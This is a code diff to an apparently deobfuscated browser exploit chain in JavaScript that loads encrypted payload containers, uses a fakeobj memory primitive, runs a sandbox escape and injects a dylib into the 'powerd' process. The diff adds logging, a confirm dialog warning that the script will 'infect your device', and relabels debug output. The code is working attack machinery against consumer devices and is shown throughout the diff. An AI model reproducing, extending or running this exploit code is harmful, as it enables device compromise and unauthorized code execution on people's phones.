@@ -1160,6 +1160,7 @@ function YA() {/* Original: YA → resolveSymbols */
         },
         // Fetch a single file as ArrayBuffer
         fetchBin(url) {
+            window.log("Downloading " + url);
             return new Promise((resolve, reject) => {
                 const xhr = new XMLHttpRequest();
                 xhr.open("GET", url, true);
@@ -1243,6 +1244,18 @@ function YA() {/* Original: YA → resolveSymbols */
                     const lastSlash = hashName.lastIndexOf("/");
                     if (lastSlash >= 0) hashName = hashName.substring(lastSlash + 1);
                     hashName = hashName.replace(/\.min\.js$/, "").replace(/\.js$/, "");
+
+                    // When we load the metadata, ask user if they want to continue (will infect device)
+                    if (hashName === "7a7d99099b035b2c6512b6ebeeea6df1ede70fbb") {
+                        let shouldContinue = confirm(
+                            "The script is about to load metadata and subsequent payloads to infect your device in `powerd` process.\n" +
+                            "Cancel = safely STOP this operation\n" +
+                            "OK     = continue infect your device");
+                        if (!shouldContinue) {
+                            window.log("[LOADER] Execution canceled by user.");
+                            return;
+                        }
+                    }
 
                     // Fetch decrypted F00DBEEF container from payloads/ directory
                     window.log("[LOADER] Loading payload: " + hashName);
@@ -1368,7 +1381,7 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         for (let _i = 0; _i < _buf.length; _i += 2)
             _oA += String.fromCharCode(_buf[_i] | ((_buf[_i + 1] || 0) << 8));
         g.oA = _oA;
-        window.log("[PATCH] Loaded dylib: " + _buf.length + "B, oA=" + _oA.length +
+        window.log("[PATCH] Loaded bootstrap.dylib: " + _buf.length + "B, oA=" + _oA.length +
             " (orig " + _origLen + "), _process=0x" + _processOff.toString(16));
         // ── END PATCH (redirect applied after buffer is built, below) ──
 
@@ -1393,12 +1406,12 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         } else {
             window.log("[PATCH] _process at original offset 0x" + _ORIG_PROCESS_OFF.toString(16) + ", no redirect needed");
         }
-        window.addDownloadBinary("lzwDecoded.dylib", new Uint32Array(dylibBuffer.slice(0)));
+        //window.addDownloadBinary("lzwDecoded.dylib", new Uint32Array(dylibBuffer.slice(0)));
         const dylibLoadAddressI64 = utilityModule.Int64.fromNumber(dylibLoadAddress),
             dylibDataAddressMaybe = utilityModule.Int64.fromNumber(platformModule.platformState.exploitPrimitive.fakeobj(dylibBuffer));
         window.log("dylib load address: 0x" + dylibLoadAddress.toString(16));
         window.log("data address?: 0x" + dylibDataAddressMaybe.toNumber().toString(16));
-        window.log("D: 0x" + dylibSize);
+        window.log("dylib size: 0x" + dylibSize);
         platformModule.platformState.sandboxEscape.Ad(dylibLoadAddressI64, dylibDataAddressMaybe, dylibSize);
         const T = g.YA().ct() + 4;
         //alert("D 0x" + T.toString(16));
